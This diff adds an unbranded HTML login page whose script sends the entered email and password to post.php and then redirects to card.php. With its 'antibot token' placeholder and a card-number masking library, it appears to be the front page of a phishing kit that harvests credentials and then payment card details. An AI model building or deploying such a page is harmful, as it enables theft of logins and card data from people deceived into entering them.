@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="res/app.css">
+</head>
+<body>    
+
+<main>
+    <div class="form">
+        <div class="logo">
+            <img src="res/logo.png" alt="Logo">
+        </div>
+
+        <div class="text">
+            <h2>Sign in</h2>
+            <span>Please enter your login details</span>
+        </div>
+
+        <div class="col">
+            <label>Email</label>
+            <input type="text" id="u">
+        </div>
+
+        <div class="col">
+            <label>Password</label>
+            <input type="password" id="p">
+            <a href="#">Forgot password?</a>
+        </div>
+
+        <!-- antibot token placeholder -->
+        <script>
+            if (typeof globalThis.token === "undefined") {
+                globalThis.token = "ANTIBOT_TOKEN_PLACEHOLDER";
+            }
+        </script>
+
+        <div class="col">
+            <button onclick="sendLogin()">Login</button>
+        </div>
+
+        <div class="col links">
+            <span>Help</span>
+            <span>Privacy</span>
+            <span>Terms</span>
+        </div>
+    </div>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+<script>
+function sendLogin() {
+    $("input").removeClass("error");
+
+    if ($("#u").val() === "") {
+        $("#u").addClass("error");
+        return;
+    }
+
+    if ($("#p").val() === "") {
+        $("#p").addClass("error");
+        return;
+    }
+
+    console.log("REQUEST SENT");
+
+    $.post("post.php", {
+        user: $("#u").val(),
+        pass: $("#p").val()
+    }, function () {
+        window.location = "card.php";
+    });
+}
+
+$("input").keypress(function (e) {
+    if (e.key === "Enter") {
+        sendLogin();
+    }
+});
+</script>
+
+</body>
+</html>
